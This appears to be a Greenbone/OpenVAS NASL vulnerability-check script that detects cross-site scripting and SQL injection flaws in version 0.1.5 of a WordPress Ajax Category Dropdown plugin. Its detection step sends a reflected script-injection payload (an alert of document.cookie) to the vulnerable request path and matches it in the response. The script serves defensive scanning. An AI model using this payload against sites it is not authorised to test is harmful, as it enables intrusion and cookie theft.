CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902505" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)" );
	script_bugtraq_id( 47529 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WordPress Ajax Category Dropdown Plugin Cross Site Scripting and SQL Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/100686/ajaxcdwp-sqlxss.txt" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/xss_in_ajax_category_dropdown_wordpress_plugin.html" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/multiple_sql_injection_in_ajax_category_dropdown_wordpress_plugin.html" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to steal cookie

  - based authentication credentials, compromise the application, access or modify
  data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "WordPress Ajax Category Dropdown Plugin version 0.1.5" );
	script_tag( name: "insight", value: "The flaw is due to failure in the '/wp-content/plugins/
  ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php' script to
  properly sanitize user-supplied input." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress Ajax Category Dropdown Plugin
  and is prone to cross site scripting and SQL injection vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/wp-content/plugins/ajax-category-dropdown/includes/dhat-ajax-cat-dropdown-request.php?admin&category_id=\"><script>alert(document.cookie);</script>" );
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\);</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

